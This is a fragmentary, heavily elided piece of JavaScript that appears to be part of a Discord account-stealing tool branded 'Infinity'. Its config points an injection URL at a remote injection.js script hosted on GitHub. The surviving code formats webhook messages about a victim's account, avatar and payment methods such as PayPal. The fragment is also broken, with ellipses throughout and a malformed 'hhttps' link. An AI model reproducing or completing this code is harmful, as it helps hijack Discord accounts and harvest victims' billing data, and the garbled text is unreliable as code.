...
const config = {
  ...
  embed_icon: 'https://cdn.discordapp.com/attachments/963257711271768084/986312208168407080/unknown.png'.replace(/ /g, '%20'),
  embed_color: 000000,
  injection_url: 'https://raw.githubusercontent.com/xptgr/images/Scripts/injection/injection.js',
    ...
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          ...
          break;
        case 2:
          billing += '<:paypal:983382659977871371> ';
          break;
      }
    }
  });
    ...
    embeds: [
      {
        ...
        author: {
          ...
          icon_url: `hhttps://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Infinity・https://dsc.gg/unlimitedness',
        },
      },
    ],
  };
